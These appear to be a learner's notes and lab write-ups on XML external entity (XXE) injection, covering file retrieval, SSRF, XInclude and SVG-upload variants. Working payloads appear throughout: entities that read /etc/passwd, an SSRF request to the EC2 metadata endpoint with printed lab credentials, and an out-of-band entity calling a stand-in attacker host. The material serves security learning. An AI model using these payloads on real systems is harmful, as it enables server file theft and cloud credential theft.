
## What is XML external entity injection?

XML external entity injection (also known as XXE) is a web security vulnerability that allows an attacker to interfere with an application's processing of XML data. It often allows an attacker to view files on the application server filesystem, and to interact with any back-end or external systems that the application itself can access.

In some situations, an attacker can escalate an XXE attack to compromise the underlying server or other back-end infrastructure, by leveraging the XXE vulnerability to perform server-side request forgery (SSRF) attacks.

## What are the types of XXE attacks?

There are various types of XXE attacks:

- [Exploiting XXE to retrieve files](https://portswigger.net/web-security/xxe#exploiting-xxe-to-retrieve-files), where an external entity is defined containing the contents of a file, and returned in the application's response.
- [Exploiting XXE to perform SSRF attacks](https://portswigger.net/web-security/xxe#exploiting-xxe-to-perform-ssrf-attacks), where an external entity is defined based on a URL to a back-end system.
- [Exploiting blind XXE exfiltrate data out-of-band](https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-exfiltrate-data-out-of-band), where sensitive data is transmitted from the application server to a system that the attacker controls.
- [Exploiting blind XXE to retrieve data via error messages](https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-retrieve-data-via-error-messages), where the attacker can trigger a parsing error message containing sensitive data.

## XXE (XML External Entity)** happens when an application parses XML without disabling external entities.

To **read a file from the server**, you do two small changes in the XML:

## **Defining an External Entity (DOCTYPE)**

This is where the **attack is prepared**.

You add (or modify) a `DOCTYPE` declaration to **define an external entity** that points to a file on the server’s filesystem.

### What it does

- Tells the XML parser:  
    👉 _“When you see this entity name, load the contents of this file.”_
    
- Uses system identifiers like `file://`.
    

### Example

`<!DOCTYPE foo [   <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>`

### Why this matters

- `xxe` becomes a **shortcut** for the file’s content.
    
- If external entities are enabled, the parser will **read the file**.
    

📌 **This step only defines the file — it does NOT leak it yet.**

---

## 2️ **Using the External Entity in Returned Data**

This is where the **data is leaked**.

You replace a normal XML value with a reference to the external entity so that its contents appear in the **application’s response**.

### What it does

- Injects the entity into a field that the server reflects back.
    
- Forces the application to **output the file contents**.
    


In this code ,
```
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
```

### Example

`<comment>&xxe;</comment>`

## What **DOCTYPE** actually does here

**DOCTYPE tells the XML parser to read extra rules before processing the XML data.**

In this case, it says:

> “Before you parse the XML content, here is a custom definition you must understand.”

## Lab 1:

**Description :**

This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response.

To solve the lab, inject an XML external entity to retrieve the contents of the `/etc/passwd` file.

**Solution :**

when we see the page , and click any one product and then click the Checkstock button and then capture the request using the burpsuite and then initial request is,

<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>1</storeId>< /  stockCheck  >

and change the request to the ,

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>
&xxe;
</productId><storeId>1</storeId></stockCheck>

and the challenge was over 

## Exploiting XXE to perform SSRF attacks :

Aside from retrieval of sensitive data, the other main impact of XXE attacks is that they can be used to perform server-side request forgery (SSRF). This is a potentially serious vulnerability in which the server-side application can be induced to make HTTP requests to any URL that the server can access.

To exploit an XXE vulnerability to perform an SSRF attack, you need to define an external XML entity using the URL that you want to target, and use the defined entity within a data value. If you can use the defined entity within a data value that is returned in the application's response, then you will be able to view the response from the URL within the application's response, and so gain two-way interaction with the back-end system. If not, then you will only be able to perform blind SSRF attacks (which can still have critical consequences).

In the following XXE example, the external entity will cause the server to make a back-end HTTP request to an internal system within the organization's infrastructure:

`<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>`

-------------------------------------------------------------------------------------------------------------

**Lab 2:**

**Description :**

This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response.

The lab server is running a (simulated) EC2 metadata endpoint at the default URL, which is `http://169.254.169.254/`. This endpoint can be used to retrieve data about the instance, some of which might be sensitive.

To solve the lab, exploit the XXE vulnerability to perform an SSRF attack that obtains the server's IAM secret access key from the EC2 metadata endpoint

**Solution :**

When we first enter the page , as we done in the lab 1 , we need to capture the request of the checkstock and then initially the request was ,

<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>1</storeId></s tockCheck>

and we need to  change to ,

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>

after the click send , we got the response as Invalid product ID: latest ,
as we add the response in end of the url , at last we got the final url as <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"> ]> and then hit send , the response was ,


"Invalid product ID: {
  "Code" : "Success",
  "LastUpdated" : "2025-12-16T14:01:47.911491320Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "4Ztd15197z7meLK2nlGG",
  "SecretAccessKey" : "vuwGVnLy2vDGzV2pyiPLntVYwgRACHBJekRgEmqk",
  "Token" : "bfB7FSVr9owkzcyRY6E0PneZqp4n2KHVJCdFrGyjVeTA7qMT6kfQdHyuqb6tBi9gC8uGWEDWt5Bz7g1pv6eOjDSfABigpmUB666QwZ0183zhijNiyzToYb8TVMld6IL2T7Zm3A64KiM2Fg2mYyX0kuD7oSZXJxu9aXoHf5Qnm2JvYB4JZKvWc2xhNnXZOeaifRhkAczmAoHBYhyhzE7ojBXDGcYOdXbQArz4A3SDa5BVVSPqwVp5Diy9AiV46BTi",
  "Expiration" : "2031-12-15T14:01:47.911491320Z"
}"

the lab solved .

-------------------------------------------------------------------------------------------------------------

**SOAP (Simple Object Access Protocol)** is a **standard XML-based messaging protocol** used by applications to **talk to other applications** over a network.

### What is a SOAP request?

A **SOAP request** is an **XML document** sent by a client (or server) to invoke an **operation** on a SOAP web service.

Basic SOAP request structure:

		<soap:Envelope>
		  <soap:Header>
		    <!-- Optional metadata (auth, tokens, etc.) -->
		  </soap:Header>
		
		  <soap:Body>
		    <!-- Actual request data -->
		  </soap:Body>
		</soap:Envelope>

- **Envelope** → Wraps the entire message
    
- **Header** → Optional (authentication, session info)
    
- **Body** → Contains the function call & user input

Example SOAP request :

	<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
	  <soap:Body>
	    <getUser>
	      <userId>123</userId>
	    </getUser>
	  </soap:Body>
	</soap:Envelope>

-------------------------------------------------------------------------------------------------------------


## Finding hidden attack surface for XXE injection

Attack surface for XXE injection vulnerabilities is obvious in many cases, because the application's normal HTTP traffic includes requests that contain data in XML format. In other cases, the attack surface is less visible. However, if you look in the right places, you will find XXE attack surface in requests that do not contain any XML.

### XInclude attacks

Some applications receive client-submitted data, embed it on the server-side into an XML document, and then parse the document. An example of this occurs when client-submitted data is placed into a back-end SOAP request, which is then processed by the backend SOAP service.

In this situation, you cannot carry out a classic XXE attack, because you don't control the entire XML document and so cannot define or modify a `DOCTYPE` element. However, you might be able to use `XInclude` instead. `XInclude` is a part of the XML specification that allows an XML document to be built from sub-documents. You can place an `XInclude` attack within any data value in an XML document, so the attack can be performed in situations where you only control a single item of data that is placed into a server-side XML document.

To perform an `XInclude` attack, you need to reference the `XInclude` namespace and provide the path to the file that you wish to include. For example:

`<foo xmlns:xi="http://www.w3.org/2001/XInclude"> <xi:include parse="text" href="file:///etc/passwd"/></foo>`


-------------------------------------------------------------------------------------------------------------

## Lab 3 :

**Description :**

This lab has a "Check stock" feature that embeds the user input inside a server-side XML document that is subsequently parsed.

Because you don't control the entire XML document you can't define a DTD to launch a classic XXE attack.

To solve the lab, inject an `XInclude` statement to retrieve the contents of the `/etc/passwd` file.

**Solution :**

as we did in the previous labs , we need to capture the checkstock feature and then the initial request is totally different from the previous labs,

productId=1&storeId=1

we don't know whether it is XML or not , and then we need to change the parameter in the productId form 1 to `<foo xmlns:xi="http://www.w3.org/2001/XInclude"> <xi:include parse="text" href="file:///etc/passwd"/></foo>`

and then hit send , the lab is solved ...

-------------------------------------------------------------------------------------------------------------

**Lab 4**

**Description :**

This lab lets users attach avatars to comments and uses the Apache Batik library to process avatar image files.

To solve the lab, upload an image that displays the contents of the `/etc/hostname` file after processing. Then use the "Submit solution" button to submit the value of the server hostname.

**Solution :**

, as we did in the previous lab , but in this lab , we need to upload the .svg image and then in that we need to edit or insert the tag 

`<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>`

and then we solved the lab....

-------------------------------------------------------------------------------------------------------------


**Most web applications are built to accept form data**

foo=bar,
    The parameter named `foo` has the value `bar`

Where does `foo=bar` come from?

HTML form example:

`<form method="POST" action="/action"> <input name="foo" value="bar"> </form>`


When submitted, the browser sends:

`Content-Type: application/x-www-form-urlencoded foo=bar`


## Modified request (XXE attack)

`POST /action HTTP/1.1 
Content-Type: text/xml 
<?xml version="1.0"?> 
<!DOCTYPE foo [ 
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]> 
<foo>&xxe;</foo>`

attacker using this payload to retrieve the information like /etc/passwd..

-------------------------------------------------------------------------------------------------------------

Sometimes, XXE attacks using regular entities are blocked, due to some input validation by the application or some hardening of the XML parser that is being used. In this situation, you might be able to use XML parameter entities instead. XML parameter entities are a special kind of XML entity which can only be referenced elsewhere within the DTD. For present purposes, you only need to know two things. First, the declaration of an XML parameter entity includes the percent character before the entity name:

`<!ENTITY % myparameterentity "my parameter entity value" >`

And second, parameter entities are referenced using the percent character instead of the usual ampersand:

`%myparameterentity;`

This means that you can test for blind XXE using out-of-band detection via XML parameter entities as follows:

`<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>`

This XXE payload declares an XML parameter entity called `xxe` and then uses the entity within the DTD. This will cause a DNS lookup and HTTP request to the attacker's domain, verifying that the attack was successful.